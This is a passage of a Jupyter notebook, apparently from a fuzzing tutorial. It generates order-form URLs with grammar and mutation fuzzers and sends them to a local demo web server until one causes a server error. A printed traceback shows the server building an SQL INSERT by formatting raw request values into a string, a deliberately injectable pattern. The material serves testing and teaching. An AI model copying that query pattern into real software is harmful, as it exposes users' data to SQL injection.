       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 51v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 61h0.0\"/><path d=\"M185.0 61h0.0\"/><path d=\"M40.0 61a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M60.0 31h8.5\"/><path d=\"M156.5 31h8.5\"/><g class=\"terminal\">\n",
       "<path d=\"M68.5 31h0.0\"/><path d=\"M156.5 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"88.0\" x=\"68.5\" y=\"20\"/><text x=\"112.5\" y=\"35\">Jane+Doe</text></g></g><path d=\"M165.0 31a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M40.0 61h20\"/><g>\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M165.0 61h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M165.0 61h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"105.0\" x=\"60.0\" y=\"50\"/><text x=\"112.5\" y=\"65\">John+Smith</text></g></g><path d=\"M165.0 61h20\"/></g><path d=\"M 185.0 61 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "email\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"92\" viewBox=\"0 0 318.5 92\" width=\"318.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 51v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 61h0.0\"/><path d=\"M278.5 61h0.0\"/><path d=\"M40.0 61a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M60.0 31h8.5\"/><path d=\"M250.0 31h8.5\"/><g class=\"terminal\">\n",
       "<path d=\"M68.5 31h0.0\"/><path d=\"M250.0 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"181.5\" x=\"68.5\" y=\"20\"/><text x=\"159.25\" y=\"35\">j.doe%40example.com</text></g></g><path d=\"M258.5 31a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M40.0 61h20\"/><g>\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M258.5 61h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M258.5 61h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"198.5\" x=\"60.0\" y=\"50\"/><text x=\"159.25\" y=\"65\">j_smith%40example.com</text></g></g><path d=\"M258.5 61h20\"/></g><path d=\"M 278.5 61 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "city\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"92\" viewBox=\"0 0 208.0 92\" width=\"208.0\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 51v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 61h0.0\"/><path d=\"M168.0 61h0.0\"/><path d=\"M40.0 61a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M60.0 31h4.25\"/><path d=\"M143.75 31h4.25\"/><g class=\"terminal\">\n",
       "<path d=\"M64.25 31h0.0\"/><path d=\"M143.75 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"79.5\" x=\"64.25\" y=\"20\"/><text x=\"104.0\" y=\"35\">Seattle</text></g></g><path d=\"M148.0 31a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M40.0 61h20\"/><g>\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M148.0 61h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 61h0.0\"/><path d=\"M148.0 61h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"88.0\" x=\"60.0\" y=\"50\"/><text x=\"104.0\" y=\"65\">New+York</text></g></g><path d=\"M148.0 61h20\"/></g><path d=\"M 168.0 61 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "zip\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"62\" viewBox=\"0 0 512.5 62\" width=\"512.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 21v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 31h0.0\"/><path d=\"M472.5 31h0.0\"/><path d=\"M40.0 31h20\"/><g>\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M452.5 31h0.0\"/><g class=\"non-terminal\">\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M122.5 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"60.0\" y=\"20\"/><text x=\"91.25\" y=\"35\">digit</text></g><path d=\"M122.5 31h10\"/><path d=\"M132.5 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M142.5 31h0.0\"/><path d=\"M205.0 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"142.5\" y=\"20\"/><text x=\"173.75\" y=\"35\">digit</text></g><path d=\"M205.0 31h10\"/><path d=\"M215.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M225.0 31h0.0\"/><path d=\"M287.5 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"225.0\" y=\"20\"/><text x=\"256.25\" y=\"35\">digit</text></g><path d=\"M287.5 31h10\"/><path d=\"M297.5 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M307.5 31h0.0\"/><path d=\"M370.0 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"307.5\" y=\"20\"/><text x=\"338.75\" y=\"35\">digit</text></g><path d=\"M370.0 31h10\"/><path d=\"M380.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M390.0 31h0.0\"/><path d=\"M452.5 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"390.0\" y=\"20\"/><text x=\"421.25\" y=\"35\">digit</text></g></g><path d=\"M452.5 31h20\"/></g><path d=\"M 472.5 31 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "digit\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"109\" viewBox=\"0 0 522.5 109\" width=\"522.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 59v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 69h0.0\"/><path d=\"M482.5 69h0.0\"/><path d=\"M40.0 69a10 10 0 0 0 10 -10v-29a10 10 0 0 1 10 -10h324.0\"/><path d=\"M138.5 89h324.0a10 10 0 0 0 10 -10v0a10 10 0 0 1 10 -10\"/><path d=\"M40.0 69h10\"/><g>\n",
       "<path d=\"M50.0 69h0.0\"/><path d=\"M118.5 69h0.0\"/><path d=\"M50.0 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M70.0 39h0.0\"/><path d=\"M98.5 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M70.0 39h0.0\"/><path d=\"M98.5 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"70.0\" y=\"28\"/><text x=\"84.25\" y=\"43\">0</text></g></g><path d=\"M98.5 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M50.0 69h20\"/><g>\n",
       "<path d=\"M70.0 69h0.0\"/><path d=\"M98.5 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M70.0 69h0.0\"/><path d=\"M98.5 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"70.0\" y=\"58\"/><text x=\"84.25\" y=\"73\">1</text></g></g><path d=\"M98.5 69h20\"/></g><path d=\"M118.5 69a10 10 0 0 1 10 10v0a10 10 0 0 0 10 10\"/><path d=\"M118.5 20a10 10 0 0 1 10 10v29a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M138.5 69h0.0\"/><path d=\"M207.0 69h0.0\"/><path d=\"M138.5 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M158.5 39h0.0\"/><path d=\"M187.0 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M158.5 39h0.0\"/><path d=\"M187.0 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"158.5\" y=\"28\"/><text x=\"172.75\" y=\"43\">2</text></g></g><path d=\"M187.0 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M138.5 69h20\"/><g>\n",
       "<path d=\"M158.5 69h0.0\"/><path d=\"M187.0 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M158.5 69h0.0\"/><path d=\"M187.0 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"158.5\" y=\"58\"/><text x=\"172.75\" y=\"73\">3</text></g></g><path d=\"M187.0 69h20\"/></g><path d=\"M207.0 69a10 10 0 0 1 10 10v0a10 10 0 0 0 10 10\"/><path d=\"M207.0 20a10 10 0 0 1 10 10v29a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M227.0 69h0.0\"/><path d=\"M295.5 69h0.0\"/><path d=\"M227.0 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M247.0 39h0.0\"/><path d=\"M275.5 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M247.0 39h0.0\"/><path d=\"M275.5 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"247.0\" y=\"28\"/><text x=\"261.25\" y=\"43\">4</text></g></g><path d=\"M275.5 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M227.0 69h20\"/><g>\n",
       "<path d=\"M247.0 69h0.0\"/><path d=\"M275.5 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M247.0 69h0.0\"/><path d=\"M275.5 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"247.0\" y=\"58\"/><text x=\"261.25\" y=\"73\">5</text></g></g><path d=\"M275.5 69h20\"/></g><path d=\"M295.5 69a10 10 0 0 1 10 10v0a10 10 0 0 0 10 10\"/><path d=\"M295.5 20a10 10 0 0 1 10 10v29a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M315.5 69h0.0\"/><path d=\"M384.0 69h0.0\"/><path d=\"M315.5 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M335.5 39h0.0\"/><path d=\"M364.0 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M335.5 39h0.0\"/><path d=\"M364.0 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"335.5\" y=\"28\"/><text x=\"349.75\" y=\"43\">6</text></g></g><path d=\"M364.0 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M315.5 69h20\"/><g>\n",
       "<path d=\"M335.5 69h0.0\"/><path d=\"M364.0 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M335.5 69h0.0\"/><path d=\"M364.0 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"335.5\" y=\"58\"/><text x=\"349.75\" y=\"73\">7</text></g></g><path d=\"M364.0 69h20\"/></g><path d=\"M384.0 69a10 10 0 0 1 10 10v0a10 10 0 0 0 10 10\"/><path d=\"M384.0 20a10 10 0 0 1 10 10v29a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M404.0 69h0.0\"/><path d=\"M472.5 69h0.0\"/><path d=\"M404.0 69a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M424.0 39h0.0\"/><path d=\"M452.5 39h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M424.0 39h0.0\"/><path d=\"M452.5 39h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"424.0\" y=\"28\"/><text x=\"438.25\" y=\"43\">8</text></g></g><path d=\"M452.5 39a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M404.0 69h20\"/><g>\n",
       "<path d=\"M424.0 69h0.0\"/><path d=\"M452.5 69h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M424.0 69h0.0\"/><path d=\"M452.5 69h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"28.5\" x=\"424.0\" y=\"58\"/><text x=\"438.25\" y=\"73\">9</text></g></g><path d=\"M452.5 69h20\"/></g><path d=\"M472.5 69h10\"/></g><path d=\"M 482.5 69 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "syntax_diagram(ORDER_GRAMMAR)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Using [one of our grammar fuzzers](GrammarFuzzer.iynb), we can instantiate this grammar and generate URLs:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.685614Z",
     "iopub.status.busy": "2021-11-01T22:34:02.685100Z",
     "iopub.status.idle": "2021-11-01T22:34:02.922556Z",
     "shell.execute_reply": "2021-11-01T22:34:02.922997Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from GrammarFuzzer import GrammarFuzzer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.930632Z",
     "iopub.status.busy": "2021-11-01T22:34:02.930024Z",
     "iopub.status.idle": "2021-11-01T22:34:02.932472Z",
     "shell.execute_reply": "2021-11-01T22:34:02.932946Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=New+York&zip=42436',\n",
       " '/order?item=drill&name=John+Smith&email=j_smith%40example.com&city=New+York&zip=56213',\n",
       " '/order?item=drill&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=63628',\n",
       " '/order?item=drill&name=John+Smith&email=j.doe%40example.com&city=Seattle&zip=59538',\n",
       " '/order?item=drill&name=Jane+Doe&email=j_smith%40example.com&city=New+York&zip=41160']"
      ]
     },
     "execution_count": 82,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "order_fuzzer = GrammarFuzzer(ORDER_GRAMMAR)\n",
    "[order_fuzzer.fuzz() for i in range(5)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Sending these URLs to the server will have them processed correctly:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.937930Z",
     "iopub.status.busy": "2021-11-01T22:34:02.937306Z",
     "iopub.status.idle": "2021-11-01T22:34:02.948576Z",
     "shell.execute_reply": "2021-11-01T22:34:02.948961Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:02] INSERT INTO orders VALUES ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:02] \"GET /order?item=lockset&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=16631 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Lock Set</strong> to Jane Doe in Seattle, 16631<br>\n",
       "  A confirmation mail will be sent to j_smith@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 83,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz())))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.952877Z",
     "iopub.status.busy": "2021-11-01T22:34:02.952281Z",
     "iopub.status.idle": "2021-11-01T22:34:02.954451Z",
     "shell.execute_reply": "2021-11-01T22:34:02.954823Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104'), ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Fuzzing with Unexpected Values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can now see that the server does a good job when faced with \"standard\" values.  But what happens if we feed it non-standard values?  To this end, we make use of a [mutation fuzzer](MutationFuzzer.ipynb) which inserts random changes into the URL.  Our seed (i.e. the value to be mutated) comes from the grammar fuzzer:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.959385Z",
     "iopub.status.busy": "2021-11-01T22:34:02.958822Z",
     "iopub.status.idle": "2021-11-01T22:34:02.961010Z",
     "shell.execute_reply": "2021-11-01T22:34:02.961436Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'"
      ]
     },
     "execution_count": 85,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "seed = order_fuzzer.fuzz()\n",
    "seed"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Mutating this string yields mutations not only in the field values, but also in field names as well as the URL structure."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.964595Z",
     "iopub.status.busy": "2021-11-01T22:34:02.964029Z",
     "iopub.status.idle": "2021-11-01T22:34:02.965930Z",
     "shell.execute_reply": "2021-11-01T22:34:02.965547Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from MutationFuzzer import MutationFuzzer  # minor deoendency"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.969946Z",
     "iopub.status.busy": "2021-11-01T22:34:02.969420Z",
     "iopub.status.idle": "2021-11-01T22:34:02.971751Z",
     "shell.execute_reply": "2021-11-01T22:34:02.972259Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n",
       " '/order?item=drill&name=Jane+Doe&email=.doe%40example.com&city=Seattle&zip=45732',\n",
       " '/order?item=drill;&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n",
       " '/order?item=drill&name=Jane+Doe&emil=j.doe%40example.com&city=Seattle&zip=45732',\n",
       " '/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=4732']"
      ]
     },
     "execution_count": 87,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "mutate_order_fuzzer = MutationFuzzer([seed], min_mutations=1, max_mutations=1)\n",
    "[mutate_order_fuzzer.fuzz() for i in range(5)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us fuzz a little until we get an internal server error.  We use the Python `requests` module to interact with the Web server such that we can directly access the HTTP status code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.976177Z",
     "iopub.status.busy": "2021-11-01T22:34:02.975616Z",
     "iopub.status.idle": "2021-11-01T22:34:02.990807Z",
     "shell.execute_reply": "2021-11-01T22:34:02.991185Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "while True:\n",
    "    path = mutate_order_fuzzer.fuzz()\n",
    "    url = urljoin(httpd_url, path)\n",
    "    r = requests.get(url)\n",
    "    if r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "That didn't take long.  Here's the offending URL:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.994577Z",
     "iopub.status.busy": "2021-11-01T22:34:02.994019Z",
     "iopub.status.idle": "2021-11-01T22:34:02.996228Z",
     "shell.execute_reply": "2021-11-01T22:34:02.996593Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'"
      ]
     },
     "execution_count": 89,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.999543Z",
     "iopub.status.busy": "2021-11-01T22:34:02.999030Z",
     "iopub.status.idle": "2021-11-01T22:34:03.009371Z",
     "shell.execute_reply": "2021-11-01T22:34:03.009791Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:03] \"GET /order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732 HTTP/1.1\" 500 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:03] Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'name'\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
